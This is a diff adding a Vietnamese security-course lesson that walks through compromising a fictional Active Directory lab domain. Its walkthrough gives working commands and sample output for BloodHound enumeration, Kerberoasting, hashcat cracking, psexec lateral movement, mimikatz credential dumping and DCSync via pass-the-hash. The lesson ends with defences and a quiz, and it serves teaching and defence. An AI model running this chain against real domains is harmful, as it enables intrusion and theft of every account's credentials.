@@ -1,0 +1,179 @@
+---
+title: "Capstone: chiếm một miền Active Directory"
+code: "5.2"
+level: 5
+summary: "Từ một tài khoản domain thường tới Domain Admin, qua BloodHound, Kerberoasting, Pass-the-Hash và DCSync."
+duration: "100 phút"
+objectives:
+  - "Thấy một chuỗi tấn công AD hoàn chỉnh nối liền"
+  - "Hiểu vai trò của BloodHound trong việc chọn đường đi"
+  - "Nối Kerberoasting → bẻ khoá → lan ngang → DCSync"
+  - "Rút ra các phát hiện và cách phòng thủ cho từng mắt xích"
+---
+import Callout from '../../components/ui/Callout.astro';
+import Terminal from '../../components/ui/Terminal.astro';
+import Walkthrough from '../../components/sim/Walkthrough.tsx';
+import ConceptMap from '../../components/sim/ConceptMap.tsx';
+import Quiz from '../../components/sim/Quiz.tsx';
+
+## Hình dung trước
+
+Active Directory hiếm khi bị hạ bằng một lỗ hổng duy nhất. Nó bị hạ bằng một **chuỗi quan hệ hợp lệ**: mỗi bước dùng quyền mình vừa có để lấy quyền lớn hơn. Bài này đi trọn một chuỗi như vậy trên miền hư cấu `megacorp.lab`, bắt đầu từ một tài khoản nhân viên thường.
+
+<Callout type="warn">
+Toàn bộ là môi trường lab hư cấu. Các kỹ thuật AD chỉ thực hành trên miền của bạn hoặc nơi được phép bằng văn bản.
+</Callout>
+
+## Điểm xuất phát
+
+Giả sử từ bài 5.1 (hoặc một đợt phishing được phép), bạn đã có **một tài khoản domain thường**: `jdoe : Summer2024!`. Tài khoản này không có gì đặc biệt — nhưng trong AD, một tài khoản thường đã đủ để liệt kê rất sâu.
+
+## Đi trọn chuỗi
+
+<Walkthrough
+  client:visible
+  title="Từ nhân viên thường tới Domain Admin"
+  steps={[
+    {
+      phase: 'Liệt kê',
+      title: 'Thu thập toàn bộ quan hệ bằng BloodHound',
+      cmd: "bloodhound-python -u jdoe -p 'Summer2024!' -d megacorp.lab -c All -ns 10.10.14.50",
+      output: [
+        { text: 'INFO: Found 42 users, 18 groups, 5 computers' },
+        { text: 'INFO: Compressed data written to bloodhound.zip', hit: true },
+      ],
+      takeaway: 'Một tài khoản thường đọc được gần hết cấu trúc AD. Nạp file .zip vào BloodHound rồi bấm "Shortest path to Domain Admins" để xem đường đi. (Bài 3.4)',
+    },
+    {
+      phase: 'Liệt kê',
+      title: 'BloodHound chỉ ra một mắt xích',
+      prompt: '(trong giao diện BloodHound)',
+      output: [
+        { text: 'jdoe  --MemberOf-->  Nhóm "SQL Admins"' },
+        { text: 'svc_sql  --có SPN-->  dễ bị Kerberoast', hit: true },
+        { text: 'svc_sql  --AdminTo-->  SQL01' },
+        { text: 'SQL01  --có session của-->  Domain Admin', hit: true },
+      ],
+      takeaway: 'Đồ thị lộ một đường đi: tài khoản dịch vụ svc_sql có SPN (Kerberoast được) và là admin trên SQL01, nơi có phiên của một Domain Admin. Kế hoạch đã rõ. (Bài 3.4, 3.5)',
+      tone: 'warn',
+    },
+    {
+      phase: 'Lấy hash',
+      title: 'Kerberoasting tài khoản dịch vụ',
+      cmd: "impacket-GetUserSPNs -request -dc-ip 10.10.14.50 megacorp.lab/jdoe:'Summer2024!'",
+      output: [
+        { text: 'ServicePrincipalName  Name' },
+        { text: 'MSSQL/sql01           svc_sql' },
+        { text: '$krb5tgs$23$*svc_sql*...$hoRtE9k...', hit: true },
+      ],
+      takeaway: 'Bất kỳ user domain nào cũng xin được vé dịch vụ của svc_sql; vé mã hoá bằng mật khẩu svc_sql, nên đem về bẻ khoá ngoại tuyến. (Bài 3.5)',
+      tone: 'bad',
+    },
+    {
+      phase: 'Lấy hash',
+      title: 'Bẻ khoá vé ngoại tuyến',
+      cmd: 'hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt',
+      output: [
+        { text: '$krb5tgs$23$...:P@ssw0rd2019', hit: true },
+      ],
+      takeaway: 'Tài khoản dịch vụ có mật khẩu yếu, ít đổi — bẻ ra "P@ssw0rd2019". Giờ ta là svc_sql, một tài khoản admin trên SQL01. (Bài 2.6, 3.5)',
+      tone: 'bad',
+    },
+    {
+      phase: 'Lan ngang',
+      title: 'Đăng nhập SQL01 bằng svc_sql',
+      cmd: "impacket-psexec megacorp.lab/svc_sql:'P@ssw0rd2019'@10.10.14.60",
+      output: [
+        { text: '[*] Found writable share ADMIN$' },
+        { text: '[*] Opening SVCManager on 10.10.14.60...' },
+        { text: 'C:\\> whoami', hit: true },
+        { text: 'nt authority\\system' },
+      ],
+      takeaway: 'svc_sql là admin trên SQL01 nên ta có SYSTEM trên máy đó. Từ đây có thể lấy thông tin đăng nhập của những ai đã/đang đăng nhập SQL01. (Bài 3.3, 3.5)',
+      tone: 'bad',
+    },
+    {
+      phase: 'Lan ngang',
+      title: 'Rút thông tin đăng nhập trong bộ nhớ',
+      cmd: 'mimikatz # sekurlsa::logonpasswords',
+      prompt: 'C:\\>',
+      output: [
+        { text: 'Username : admin_dom' },
+        { text: 'NTLM     : aad3b...31d6c...', hit: true },
+        { text: '(phiên của một Domain Admin trên SQL01)' },
+      ],
+      takeaway: 'SQL01 có phiên của Domain Admin "admin_dom"; lấy được hash NTLM của họ. Không cần bẻ khoá — dùng thẳng bằng Pass-the-Hash. (Bài 3.5)',
+      tone: 'bad',
+    },
+    {
+      phase: 'Chiếm miền',
+      title: 'DCSync để rút toàn bộ hash của miền',
+      cmd: "impacket-secretsdump -hashes :aad3b...31d6c 'megacorp.lab/admin_dom@10.10.14.50'",
+      output: [
+        { text: '[*] Dumping Domain Credentials (DCSync)' },
+        { text: 'Administrator:500:aad3b...:c0ffee...:::', hit: true },
+        { text: 'krbtgt:502:aad3b...:31d6c...:::' },
+      ],
+      takeaway: 'admin_dom có quyền của Domain Admin, cho phép giả làm DC yêu cầu đồng bộ (DCSync) và rút hash của MỌI tài khoản, kể cả Administrator và krbtgt. Miền đã thuộc về ta. (Bài 3.5)',
+      tone: 'bad',
+    },
+    {
+      phase: 'Báo cáo',
+      title: 'Các phát hiện trong chuỗi',
+      takeaway: 'Chuỗi này không có "lỗ hổng phần mềm" nào — toàn là cấu hình: (1) tài khoản dịch vụ có SPN + mật khẩu yếu (Kerberoast); (2) Domain Admin đăng nhập lên máy thường SQL01 (lộ phiên); (3) quyền cho phép DCSync. Mỗi cái là một phát hiện với khắc phục riêng. (Bài 4.1)',
+      tone: 'good',
+    },
+  ]}
+/>
+
+## Đường đi, nhìn một lần
+
+<ConceptMap
+  client:visible
+  title="Chuỗi quan hệ từ jdoe tới Domain Admin"
+  width={660}
+  height={240}
+  nodes={[
+    { id: 'jdoe', label: 'jdoe', sub: 'nhân viên', x: 80, y: 120, detail: 'Tài khoản domain thường, điểm xuất phát.' },
+    { id: 'svc', label: 'svc_sql', sub: 'Kerberoast', x: 250, y: 120, tone: 'warn', detail: 'Có SPN nên bị Kerberoast; mật khẩu yếu nên bẻ được. Lại là admin trên SQL01.' },
+    { id: 'sql', label: 'SQL01', sub: 'SYSTEM', x: 420, y: 120, tone: 'warn', detail: 'Chiếm được nhờ svc_sql. Có phiên của một Domain Admin trong bộ nhớ.' },
+    { id: 'da', label: 'Domain Admin', sub: 'DCSync', x: 590, y: 120, tone: 'accent', detail: 'Lấy hash admin_dom bằng Pass-the-Hash, rồi DCSync rút toàn bộ hash miền.' },
+  ]}
+  edges={[
+    { from: 'jdoe', to: 'svc', label: 'kerberoast' },
+    { from: 'svc', to: 'sql', label: 'admin' },
+    { from: 'sql', to: 'da', label: 'lộ phiên' },
+  ]}
+/>
+
+<Callout type="note">
+Mỗi mũi tên là một quan hệ hợp lệ, được cấu hình có chủ đích trong một công ty thật. Không cái nào riêng lẻ là "lỗi". Chính việc chúng nối thành đường đi mới là vấn đề — và đó là lý do BloodHound (vẽ ra đường đi) quan trọng đến vậy.
+</Callout>
+
+## Góc phòng thủ
+
+<Callout type="defense">
+Cắt chuỗi ở bất kỳ mắt xích nào là đủ chặn:
+<br />• Đặt mật khẩu dài, đổi tự động cho tài khoản dịch vụ (gMSA) → Kerberoast vô dụng.
+<br />• Không cho Domain Admin đăng nhập lên máy thường (phân tầng quản trị) → SQL01 không còn lộ phiên DA.
+<br />• Rà soát và giới hạn quyền cho phép DCSync → chặn nước đi cuối.
+<br />• Chạy BloodHound định kỳ để tự tìm và cắt những đường đi này trước kẻ tấn công.
+</Callout>
+
+## Kiểm tra nhanh
+
+<Quiz
+  client:visible
+  questions={[
+    { q: 'Vì sao một tài khoản domain thường đã đủ để bắt đầu?', options: ['Vì nó là admin', 'Vì tài khoản thường vẫn đọc được phần lớn cấu trúc AD để liệt kê (BloodHound)', 'Vì AD không có bảo vệ'], answer: 1, explain: 'AD cho user thường đọc nhiều thông tin; BloodHound biến chúng thành đồ thị đường đi.' },
+    { q: 'Mắt xích Kerberoasting trong chuỗi khai thác điều gì?', options: ['Lỗ hổng phần mềm DC', 'Tài khoản dịch vụ có SPN với mật khẩu yếu', 'Mật khẩu để lộ trong file'], answer: 1, explain: 'Vé dịch vụ mã hoá bằng mật khẩu svc_sql; mật khẩu yếu nên bẻ được.' },
+    { q: 'DCSync cho kẻ tấn công thứ gì ở cuối chuỗi?', options: ['Một web shell', 'Hash của mọi tài khoản trong miền, kể cả Administrator và krbtgt', 'Quyền đọc một file'], answer: 1, explain: 'Với quyền phù hợp, DCSync giả làm DC và rút toàn bộ hash miền.' },
+    { q: 'Cách phòng thủ hiệu quả nhất với cả chuỗi là gì?', options: ['Đổi tên miền', 'Cắt bất kỳ một mắt xích nào (gMSA, phân tầng quản trị, giới hạn DCSync)', 'Tắt BloodHound'], answer: 1, explain: 'Chuỗi đứt khi một mắt xích đứng vững; không cần chặn hết mọi thứ cùng lúc.' },
+  ]}
+/>
+
+## Ghi nhớ
+
+- Tấn công AD = nối các quan hệ hợp lệ thành đường đi; BloodHound giúp thấy đường đó.
+- Chuỗi kinh điển: Kerberoast → bẻ khoá → lan ngang (PtH) → DCSync → cả miền.
+- Không mắt xích nào riêng lẻ là "lỗi"; phòng thủ là cắt một mắt xích bất kỳ.
